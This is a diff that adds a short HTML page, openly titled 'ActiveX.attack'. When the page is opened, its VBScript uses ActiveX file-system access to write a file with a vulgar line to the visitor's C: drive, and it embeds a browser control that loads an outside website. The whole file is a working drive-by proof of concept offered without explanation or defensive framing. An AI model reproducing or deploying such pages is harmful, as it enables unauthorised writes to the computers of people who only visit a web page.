@@ -1,0 +1,19 @@
+<HTML>
+<HEAD>
+<TITLE>ActiveX.attack</TITLE>
+</HEAD>
+<BODY>
+<H3><center>ActiveX.stream<H3>
+<SCRIPT language="VBScript">
+ Dim objFile, strBadFile, strFilePath
+ strFilePath = "c:\DhananjayaActivex10.txt"
+ Set objFile = CreateObject("Scripting.FileSystemObject")
+ Set strBadFile = objFile.CreateTextFile(strFilePath, True)
+ strBadFile.WriteLine("Tastes Like pussy")
+ strBadFile.Close
+</SCRIPT>
+<OBJECT ID="WebBrowser1" WIDTH=330 HEIGHT=150  CLASSID="CLSID:8856F966-340A-11D0-A96B-00C04FD663A2">
+   <PARAM NAME="Location" VALUE="https://syber-defense-system.business.site/">
+   </OBJECT>
+   </BODY>
+     </HTML>
